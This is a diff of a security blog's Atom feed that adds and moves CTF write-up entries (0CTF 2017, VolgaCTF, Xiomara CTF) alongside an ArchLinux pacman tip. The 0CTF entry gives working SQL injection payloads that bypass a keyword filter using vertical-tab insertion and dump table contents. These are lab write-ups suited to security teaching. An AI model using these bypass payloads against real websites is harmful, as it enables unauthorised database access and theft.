-<p><code>?id=99999 UNION SEL%0bECT 1,2,3</code> 99999 is an out of range id so the <code>UNION</code> statement is executed. <code>2</code> is displayed in the <code>&lt;h3&gt;&lt;/h3&gt;</code>, <code>3</code> is displayed in the <code>&lt;div class=&quot;main&quot;&gt;3&lt;/div&gt;</code> and <code>1</code> is displayed in the link <code>&lt;a href=&quot;index.php?id=1&quot;&gt;</code>.</p>
-<p>Now let's identify the databse:</p>
-<ul>
-<li><code>?id=99999 UNION SEL%0bECT 1,user(),version()</code>: user: <code>news@localhost</code>, version: <code>5.7.17-0ubuntu0.16.04.1</code></li>
-<li><code>?id=99999 UNION SEL%0bECT 1,database(),3</code>: database: <code>news</code></li>
-<li><code>?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news'</code>: table name: <code>flag</code></li>
-<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -</code>: 1st column name: <code>flag</code></li>
-<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -</code>: there is only 1 column</li>
-<li><code>?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag</code>: flag: <code>flag{W4f_bY_paSS_f0R_CI}</code></li>
-</ul>
-<p>References: <a href="http://sechow.com/bricks/docs/content-page-1.html" target="_blank" rel="external">1</a> - <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#SQLi" target="_blank" rel="external">2</a></p>
+<p><code>A.png</code>:</p>
+<p><img src="http://i.imgur.com/Jj8s6vX.png" alt="A"></p>
+<p><code>B.png</code>:</p>
+<p><img src="http://i.imgur.com/gd3iCKb.png" alt="B"></p>
+<h2 id="solution">Solution</h2>
+<p>If you know <a href="https://en.wikipedia.org/wiki/One-time_pad" target="_blank" rel="external">OTP</a> you must know this famous attack on <a href="http://crypto.stackexchange.com/questions/59/taking-advantage-of-one-time-pad-key-reuse" target="_blank" rel="external">pad reused</a>.</p>
+<p>You can also see some black lines on image B. Now let's XOR image A and B (with <a href="http://stackoverflow.com/questions/8504882/searching-for-a-way-to-do-bitwise-xor-on-images" target="_blank" rel="external">ImageMagick</a>):</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ convert A.png B.png -fx &quot;(((255*u)&amp;(255*(1-v)))|((255*(1-u))&amp;(255*v)))/255&quot; out.png</div></pre></td></tr></table></figure></p>
+<p>And now we get the result:</p>
+<p><img src="http://i.imgur.com/8uwlM0o.png" alt="out"></p>
+<p>Flag is: <code>VolgaCTF{Classic_secret_sharing_scheme}</code>.</p>
+<p><strong>Note</strong>: <em>VC</em> is for <em>Visual Cryptography</em></p>
 ]]></content>
     
     <summary type="html">
@@ -980,7 +1120,7 @@
     
       <category term="security" scheme="https://rawsec.ml/tags/security/"/>
     
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+      <category term="crypto" scheme="https://rawsec.ml/tags/crypto/"/>
     
       <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
     
@@ -1222,6 +1362,135 @@
   </entry>
   
   <entry>
+    <title>ArchLinux - Pacman error: $filename exists in filesystem</title>
+    <link href="https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/"/>
+    <id>https://rawsec.ml/en/archlinux-pacman-error-filename-exists-in-filesystem/</id>
+    <published>2017-03-20T23:00:00.000Z</published>
+    <updated>2017-03-21T23:03:54.744Z</updated>
+    
+    <content type="html"><![CDATA[<p>Before each update, check <a href="https://www.archlinux.org/news/" target="_blank" rel="external">Archlinux news</a>, there may be special instructions.</p>
+<p>When updating you system with <code># pacman -Syu</code> you may sometimes encounter this error:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">error: could not prepare transaction</div><div class="line">error: failed to commit transaction (conflicting files)</div><div class="line">libname: /absolut/file/path exists in filesystem</div><div class="line">Errors occurred, no packages were upgraded.</div></pre></td></tr></table></figure></p>
+<p><code>pacman</code> has detected a file conflict, and is preventing you to overwrite those files. So it's user responsability to take a decision.</p>
+<p>To solve this you have to check that those files are not used by any installed package with the command: <code>$ pacman -Qo /absolut/file/path</code>.</p>
+<p>If no package is using the file you will get this normal error:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ pacman -Qo /absolut/file/path</div><div class="line">error: No package owns /absolut/file/path</div></pre></td></tr></table></figure></p>
+<p>Now you can rename the file (<code>mv /path/file.ext /path/file.ext.bck</code>), then try the update again <code># pacman -Syu</code> and then remove the, now, useless file (<code>rm /path/file.ext.bck</code>).</p>
+<p>But if the file is used <a href="https://wiki.archlinux.org/index.php/Reporting_bug_guidelines" target="_blank" rel="external">report a bug</a>.</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Before each update, check &lt;a href=&quot;https://www.archlinux.org/news/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Archlinux news&lt;/a&gt;, there may be speci
+    
+    </summary>
+    
+      <category term="linux" scheme="https://rawsec.ml/categories/linux/"/>
+    
+      <category term="archlinux" scheme="https://rawsec.ml/categories/linux/archlinux/"/>
+    
+    
+      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
+    
+      <category term="archlinux" scheme="https://rawsec.ml/tags/archlinux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>0CTF 2017 Quals - Write-ups</title>
+    <link href="https://rawsec.ml/en/0CTF-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/0CTF-2017-write-ups/</id>
+    <published>2017-03-20T23:00:00.000Z</published>
+    <updated>2017-03-21T22:21:12.327Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : 0CTF 2017 Quals</li>
+<li><strong>Website</strong> : <a href="https://ctf.0ops.net/" target="_blank" rel="external">ctf.0ops.net</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/402" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="welcome-misc">Welcome - Misc</h2>
+<blockquote>
+<p>Welcome to 0CTF 2017~</p>
+<p>irc: <a href="http://irc.freenode.net" target="_blank" rel="external">irc.freenode.net</a> #0ctf2017</p>
+</blockquote>
+<p><code>flag{Welcome_to_0CTF_2017}</code></p>
+<h2 id="simplesqlin-web">simplesqlin - Web</h2>
+<blockquote>
+<p><a href="http://202.120.7.203" target="_blank" rel="external">http://202.120.7.203</a></p>
+</blockquote>
+<p>The injectable request: <code>http://202.120.7.203/index.php?id=3</code>.</p>
+<p>Keywords blocked:</p>
+<ul>
+<li><code>SELECT</code>, <code>sElEcT</code>, <code>%53elect</code>, <code>sel/**/ect</code> (not blocked but doesn't work), <code>/*!%53eLEct*/</code></li>
+<li><code>FROM</code></li>
+<li><code>WHERE</code></li>
+</ul>
+<p><code>?id=2 order by 3</code> works and <code>?id=2 order by 4</code> doesn't so there is 3 columns in the actual table.</p>
+<p>Keywords blocked need to be escaped, so we need to try some WAF bypass techniques. As you can see in the previous part (<em>Keywords blocked</em>), a lot of tricks don't work but I find one that is working: <code>se%0blect</code>, injecting a character that does nothing in our context like <code>%0b</code> (vertical tab) or <code>%07</code> (bell).</p>
+<p><code>?id=99999 UNION SEL%0bECT 1,2,3</code> 99999 is an out of range id so the <code>UNION</code> statement is executed. <code>2</code> is displayed in the <code>&lt;h3&gt;&lt;/h3&gt;</code>, <code>3</code> is displayed in the <code>&lt;div class=&quot;main&quot;&gt;3&lt;/div&gt;</code> and <code>1</code> is displayed in the link <code>&lt;a href=&quot;index.php?id=1&quot;&gt;</code>.</p>
+<p>Now let's identify the databse:</p>
+<ul>
+<li><code>?id=99999 UNION SEL%0bECT 1,user(),version()</code>: user: <code>news@localhost</code>, version: <code>5.7.17-0ubuntu0.16.04.1</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,database(),3</code>: database: <code>news</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,table_name,3 FR%0bOM information_schema.tables W%0bHERE table_schema = 'news'</code>: table name: <code>flag</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 0,1 -- -</code>: 1st column name: <code>flag</code></li>
+<li><code>?id=99999 UNION SEL%0bECT 1,column_name,3 fr%0bom information_schema.columns whe%0bre table_schema='news' and table_name='flag' LIMIT 1,1 -- -</code>: there is only 1 column</li>
+<li><code>?id=99999 UNION SEL%0bECT 1,flag,3 fr%0bom news.flag</code>: flag: <code>flag{W4f_bY_paSS_f0R_CI}</code></li>
+</ul>
+<p>References: <a href="http://sechow.com/bricks/docs/content-page-1.html" target="_blank" rel="external">1</a> - <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF#SQLi" target="_blank" rel="external">2</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
+&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;By&lt;/th&gt;
+&lt;th&gt;Version&lt;/th&gt;
+&lt;th&gt;Comment&lt;/th&gt;
+&lt;/t
+    
+    </summary>
+    
+      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
+    
+    
+      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
+    
+      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
+    
+      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
+    
+      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Pragyan CTF 2017 - Write-ups</title>
     <link href="https://rawsec.ml/en/PragyanCTF-2017-write-ups/"/>
     <id>https://rawsec.ml/en/PragyanCTF-2017-write-ups/</id>
@@ -1388,115 +1657,6 @@ Download file here:</p>
       <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
       <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Xiomara CTF 2017 - Write-ups</title>
-    <link href="https://rawsec.ml/en/XiomaraCTF-2017-write-ups/"/>
-    <id>https://rawsec.ml/en/XiomaraCTF-2017-write-ups/</id>
-    <published>2017-02-26T23:00:00.000Z</published>
-    <updated>2017-02-27T19:36:18.969Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
-<h3 id="version">Version</h3>
-<table>
-<thead>
-<tr>
-<th>By</th>
-<th>Version</th>
-<th>Comment</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>noraj</td>
-<td>1.0</td>
-<td>Creation</td>
-</tr>
-</tbody>
-</table>
-<h3 id="ctf">CTF</h3>
-<ul>
-<li><strong>Name</strong> : Xiomara CTF 2017</li>
-<li><strong>Website</strong> : <a href="https://xiomara.xyz/" target="_blank" rel="external">xiomara.xyz</a></li>
-<li><strong>Type</strong> : Online</li>
-<li><strong>Format</strong> : Jeopardy</li>
-<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/430/" target="_blank" rel="external">link</a></li>
-</ul>
-<h2 id="50-easy-login-web-exploitation">50 - Easy Login? - Web Exploitation</h2>
-<blockquote>
-<p>An aspiring engineer started learning web development on Youtube a day ago and he was asked to build a nice, secure, simple login page as part of his project. Well, he just started off so don't blame him. Go, hack!</p>
-<p><a href="http://139.59.61.220:23478/" target="_blank" rel="external">http://139.59.61.220:23478/</a></p>
-</blockquote>
-<p>The source is suspicious:</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"main.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"flag.css"</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">align</span>= <span class="string">"center"</span>&gt;</span>Login Portal<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></div><div class="line"></div><div class="line">        <span class="tag">&lt;<span class="name">b</span>&gt;</span>Username :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span> =<span class="string">"username"</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></div><div class="line">       <span class="tag">&lt;<span class="name">b</span>&gt;</span> Password :<span class="tag">&lt;<span class="name">b</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span> /&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">onclick</span>=<span class="string">"Login()"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"verify"</span> <span class="attr">name</span>=<span class="string">"button"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p>Let's see <code>main.js</code>:</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Login</span>(<span class="params"></span>)</span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> username=<span class="built_in">document</span>.login.username.value;</div><div class="line">    <span class="keyword">var</span> password=<span class="built_in">document</span>.login.password.value;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (password == <span class="string">"53cure"</span> &amp;&amp; username==<span class="string">"@nokh@"</span>) &#123;</div><div class="line">        alert(<span class="string">"Awesome!"</span>);</div><div class="line">             <span class="built_in">window</span>.open(<span class="string">"secureflag.html"</span>);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"Oh swap!You are close. Why cant you try again?"</span>);</div><div class="line"></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>Now we can use <code>@nokh@</code> and <code>53cure</code> or directly go to <a href="http://139.59.61.220:23478/secureflag.html" target="_blank" rel="external">http://139.59.61.220:23478/secureflag.html</a>.</p>
-<p>The image is named <code>hiddenflag.jpeg</code> so let's download it.</p>
-<p>There is some hidden data here:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">$ binwalk hiddenflag.jpeg</div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">0             0x0             JPEG image data, JFIF standard 1.01</div><div class="line">48981         0xBF55          Zip archive data, at least v1.0 to extract, compressed size: 29, uncompressed size: 29, name: flag.txt</div><div class="line">49154         0xC002          End of Zip archive</div><div class="line"></div><div class="line">$ foremost -v hiddenflag.jpeg</div><div class="line">Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus</div><div class="line">Audit File</div><div class="line"></div><div class="line">Foremost started at Sun Feb 26 19:14:21 2017</div><div class="line">Invocation: foremost -v hiddenflag.jpeg</div><div class="line">Output directory: /home/noraj/CTF/XiomaraCTF/2017/output</div><div class="line">Configuration file: /etc/foremost.conf</div><div class="line">Processing: hiddenflag.jpeg</div><div class="line">|------------------------------------------------------------------</div><div class="line">File: hiddenflag.jpeg</div><div class="line">Start: Sun Feb 26 19:14:21 2017</div><div class="line">Length: 48 KB (49176 bytes)</div><div class="line"></div><div class="line">Num	 Name (bs=512)	       Size	 File Offset	 Comment</div><div class="line"></div><div class="line">0:	00000000.jpg 	      47 KB 	          0 	 </div><div class="line">foundat=flag.txtUT</div><div class="line">1:	00000095.zip 	      196 B 	      48981 	 </div><div class="line">*|</div><div class="line">Finish: Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">2 FILES EXTRACTED</div><div class="line"></div><div class="line">jpg:= 1</div><div class="line">zip:= 1</div><div class="line">------------------------------------------------------------------</div><div class="line"></div><div class="line">Foremost finished at Sun Feb 26 19:14:21 2017</div><div class="line"></div><div class="line">$ cd output/zip</div><div class="line"></div><div class="line">$ unzip 00000095.zip</div><div class="line">Archive:  00000095.zip</div><div class="line"> extracting: flag.txt</div><div class="line"></div><div class="line">$ cat flag.txt</div><div class="line">xiomara&#123;50_y0u_ar3_@_h@ck3r&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="50-lulz-web-exploitation">50 - Lulz - Web Exploitation</h2>
-<blockquote>
-<p>Heavy sarcasm awaits. Are you a person who finds opportunities even in trolls? Well, let's find out.</p>
-<p><a href="http://139.59.61.220:23456" target="_blank" rel="external">http://139.59.61.220:23456</a></p>
-</blockquote>
-<p>The webpage is a troll opening a pop-up and redirecting to a troll page: <a href="http://139.59.61.220:23456/troll.html" target="_blank" rel="external">http://139.59.61.220:23456/troll.html</a></p>
-<p>But of course you are using NoScript or know about <code>view-source:</code> in Firefox.</p>
-<p>Let's see the source (<code>view-source:http://139.59.61.220:23456/</code>):</p>
-<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Hahaha!!!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> =<span class="string">"lol.jpg"</span> <span class="attr">align</span> =<span class="string">"center"</span> <span class="attr">width</span> =<span class="string">"50%"</span> <span class="attr">height</span> = <span class="string">"50%"</span> <span class="attr">alt</span> =<span class="string">"lollol"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"hook.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div></pre></td></tr></table></figure></p>
-<p><code>hook.js</code> source:</p>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">catch_me</span>(<span class="params"></span>)</span></div><div class="line">&#123;</div><div class="line">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]]) <span class="comment">/*VERY LONG*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"> <span class="function"><span class="keyword">function</span> <span class="title">Redirect</span>(<span class="params"></span>) </span>&#123;</div><div class="line">               <span class="built_in">window</span>.location=<span class="string">"troll.html"</span>;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            alert(<span class="string">"Warning you are about to be trolled"</span>);</div><div class="line">            setTimeout(<span class="string">'Redirect()'</span>, <span class="number">0</span>);</div></pre></td></tr></table></figure></p>
-<p>The <code>catch_me()</code> function looks like some brainfuck-js.</p>
-<p>Copy it and paste it in your browser terminal, you will get:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;alert(Xiomara&#123;i_4gr33_Y0U_4r3_a_Flash!&#125;))&quot;</div></pre></td></tr></table></figure></p>
-<p>The is a <s>mistake</s> troll, so correct <code>Xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> into <code>xiomara{i_4gr33_Y0U_4r3_a_Flash!}</code> (lowercase the first char).</p>
-<h2 id="50-no-flags-web-exploitation">50 - No Flags? - Web Exploitation</h2>
-<blockquote>
-<p>What would you do if we tell you there are no flags for this question? Go on, solve it. That reminds me, Nothing is impossible.</p>
-<p><a href="http://139.59.61.220:23467/" target="_blank" rel="external">http://139.59.61.220:23467/</a></p>
-</blockquote>
-<p>I tried <a href="http://139.59.61.220:23467/robots.txt" target="_blank" rel="external"><code>robots.txt</code></a>:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">User-agent:*</div><div class="line">Disallow: /flags/</div><div class="line">Disallow: /more_flags/</div><div class="line">Disallow: /more_and_more_flags/</div><div class="line">Disallow: /no_flag/</div></pre></td></tr></table></figure></p>
-<p><code>/flags/</code>, <code>/more_flags/</code> and <code>/more_and_more_flags/</code> are obviously trolls.</p>
-<p>Let's see <code>/no_flag/</code> source:</p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">function encode(str) &#123;</div><div class="line">str = str.replace(/http:/g, "^^^");</div><div class="line">str = str.replace(/bin/g, "*^$#!")</div><div class="line">str= str.replace(/com/g, "*%=_()");</div><div class="line">str= str.replace(/paste/g, "~~@;;");</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;iframe src="flag.txt" width="2500" height="2255"&gt;</div><div class="line">&lt;/iframe&gt;</div></pre></td></tr></table></figure></p>
-<p>It's an iframe of <code>flag.txt</code> which containd some ASCII art, like the three others. But this time there is a script.</p>
-<p>The ASCII art display <em>YOU HAVE BEEN HACKED !</em> but on the middle of <em>HACKED</em> we can see <code>&quot;^^^//~~@;;*^$#!.*%=_()/SwzEKazp&quot;</code>.</p>
-<p>So let's replace back: <code>http://pastebin.com/SwzEKazp</code>.</p>
-<p>So go to pastebin and... <code>This page has been removed!</code>.</p>
-<p>So go to the <a href="https://web.archive.org/web/20170225133747/http://pastebin.com/SwzEKazp" target="_blank" rel="external">wayback machine</a>, there is a snapshot dating from 25 Feb. 2017.</p>
-<p>We can see an untitled document from <em>XIOMARA_CTF</em> containing: <code>eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==</code>.</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ printf %s &apos;eGlvbWFyYXsxXzRtX21yX3IwYjA3fQ==&apos; | base64 -di</div><div class="line">xiomara&#123;1_4m_mr_r0b07&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="web" scheme="https://rawsec.ml/tags/web/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
   </entry>
   
@@ -1757,6 +1917,115 @@ Download file here:</p>
       <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
       <category term="forensics" scheme="https://rawsec.ml/tags/forensics/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Xiomara CTF 2017 - Write-ups</title>
+    <link href="https://rawsec.ml/en/XiomaraCTF-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/XiomaraCTF-2017-write-ups/</id>
+    <published>2017-02-26T23:00:00.000Z</published>
+    <updated>2017-02-27T19:36:18.969Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : Xiomara CTF 2017</li>
+<li><strong>Website</strong> : <a href="https://xiomara.xyz/" target="_blank" rel="external">xiomara.xyz</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/430/" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="50-easy-login-web-exploitation">50 - Easy Login? - Web Exploitation</h2>
+<blockquote>
+<p>An aspiring engineer started learning web development on Youtube a day ago and he was asked to build a nice, secure, simple login page as part of his project. Well, he just started off so don't blame him. Go, hack!</p>
+<p><a href="http://139.59.61.220:23478/" target="_blank" rel="external">http://139.59.61.220:23478/</a></p>
+</blockquote>
+<p>The source is suspicious:</p>
